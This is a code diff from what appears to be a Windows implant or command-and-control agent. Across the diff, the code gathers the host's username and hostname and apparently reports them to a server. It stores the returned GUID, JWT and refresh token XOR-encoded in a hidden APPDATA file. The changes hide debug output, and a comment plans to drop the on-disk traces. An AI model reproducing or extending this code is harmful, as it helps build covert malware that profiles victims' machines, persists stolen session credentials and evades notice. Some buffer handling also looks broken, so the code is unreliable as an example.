@@ -2,9 +2,9 @@
 #include "apiFunc.hpp"
 #include "networkManager.hpp"
 #include "bytes.hpp"
-extern "C" {
-	#include "cJSON.h"
-}
+//extern "C" {
+//	#include "cJSON.h"
+//}
 
 
 #define MAX_FILE_SIZE 500 
@@ -16,9 +16,12 @@ void XOR(PCHAR src, SIZE_T size, PCHAR out, UCHAR key) {
 	}
 }
 
+/*
+	TODO
+		remove on disk shit entirley
 
-// Handles initlisation, checking if file exists
-// if it does retieve info, else collect info and send
+
+*/
 BOOL init() {
 	char Buffer[MAX_PATH];
 	WinApis->GetEnvironmentVariableA("APPDATA", Buffer, sizeof(Buffer));
@@ -54,25 +57,27 @@ BOOL GrabAuthInfo(char* FilePath) {
 		return FALSE;
 	}
 	XOR((PCHAR)buffer, bytesRead, (PCHAR)buffer, 0xFF);
-
 	buffer[bytesRead] = '\0';
-	g_Bytes->index = 0;
+	g_Bytes->Set(buffer, bytesRead);
 
-	UINT Guidlen = g_Bytes->Read4((PBYTE)buffer);
+	
+	//g_Bytes->index = 0;
+
+	UINT Guidlen = g_Bytes->Read4();
 	printf("len -> %d\n", Guidlen);
 	PCHAR Guid = AllocMemory<CHAR>(Guidlen);
-	g_Bytes->ReadBytes((PBYTE)buffer, (PBYTE)Guid, Guidlen);
+	g_Bytes->ReadBytes((PBYTE)Guid, Guidlen);
 	Guid[Guidlen] = '\0';
 
 
-	UINT JwtLen = g_Bytes->Read4((PBYTE)buffer);
+	UINT JwtLen = g_Bytes->Read4();
 	PCHAR Jwt = AllocMemory<CHAR>(JwtLen);
-	g_Bytes->ReadBytes((PBYTE)buffer, (BYTE*)Jwt, JwtLen);
+	g_Bytes->ReadBytes((BYTE*)Jwt, JwtLen);
 	printf("JWT -> %s\n", Jwt);
 
-	UINT RefreshLen = g_Bytes->Read4((PBYTE)buffer);
+	UINT RefreshLen = g_Bytes->Read4();
 	PCHAR Refresh = AllocMemory<CHAR>(RefreshLen);
-	g_Bytes->ReadBytes((PBYTE)buffer, (BYTE*)Refresh, RefreshLen);
+	g_Bytes->ReadBytes((BYTE*)Refresh, RefreshLen);
 	printf("Refresh -> %s\n", Refresh);
 
 	AuthConf->authToken = _strdup(Jwt);
@@ -118,22 +123,34 @@ char* _GetHostName() {
 	return HostName;
 }
 
+
+/*
+	TODO
+		fix this, handle binaty msg 
+*/
+
 BOOL CollectHostInfo() {
+#ifdef _DEBUG
 	printf("Collecting User Info\n");
+#endif
 	BOOL ParseAndSaveAuth(PBYTE data, PCHAR Guid, DWORD DataLength);
 	
 	char* UserName = NULL;
 	char* HostName = NULL;
 
 	if ((UserName = _GetUserName()) == NULL) {
+#ifdef _DEBUG
 		printf("Usernam fail\n");
+#endif
 		HeapFree(GetProcessHeap(), NULL, UserName);
 		return FALSE;
 	}
 
 	
 	if ((HostName = _GetHostName()) == NULL) {
-		printf("Hostname fail\n");
+#ifdef _DEBUG
+		printf("hostname fail\n");
+#endif
 		HeapFree(GetProcessHeap(), NULL, HostName);
 		HeapFree(GetProcessHeap(), NULL, UserName);
 		return FALSE;
@@ -183,6 +200,8 @@ BOOL CollectHostInfo() {
 		return FALSE;
 	}
 
+	
+
 	printf("%lu\n", ResponseLength);
 	if (ResponseLength > 0) {
 		if (!ParseAndSaveAuth((PBYTE)BinaryResponse, GUIDBuffer, ResponseLength)) return FALSE;
@@ -193,6 +212,8 @@ BOOL CollectHostInfo() {
 
 
 }
+
+
 
 
 
@@ -209,6 +230,9 @@ BOOL ParseAndSaveAuth(PBYTE data, PCHAR Guid, DWORD DataLength) {
 	if ((hFile = WinApis->CreateFileA(FullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL)) == INVALID_HANDLE_VALUE) {
 		return FALSE;
 	}
+	printf("Opened File\n");
+
+	g_Bytes->Set(data, DataLength);
 
 
   /*
@@ -230,22 +254,24 @@ BOOL ParseAndSaveAuth(PBYTE data, PCHAR Guid, DWORD DataLength) {
 
 
 	g_Bytes->index = 0;
-	UINT ErrorCodeCheck = g_Bytes->Read4(data);
+	UINT ErrorCodeCheck = g_Bytes->Read4();
 	if (ErrorCodeCheck > 0) {
 		WinApis->CloseHandle(hFile);
 		return FALSE;
 	}
 
-	UINT JwtLen = g_Bytes->Read4(data);
+	UINT JwtLen = g_Bytes->Read4();
+	printf("JwtLen -> %d\n", JwtLen);
 	PCHAR Jwt = AllocMemory<CHAR>(JwtLen);;
 
-	g_Bytes->ReadBytes(data, (BYTE*)Jwt, JwtLen);
+	g_Bytes->ReadBytes((BYTE*)Jwt, JwtLen);
+	printf("511");
 
-	UINT RefreshLen = g_Bytes->Read4(data);
+	UINT RefreshLen = g_Bytes->Read4();
 	PCHAR Refresh = AllocMemory<CHAR>(RefreshLen);
 
 
-	g_Bytes->ReadBytes(data, (BYTE*)Refresh, RefreshLen);
+	g_Bytes->ReadBytes((BYTE*)Refresh, RefreshLen);
 
 	AuthConf->authToken = _strdup(Jwt);
 	AuthConf->RefreshToken = _strdup(Refresh);
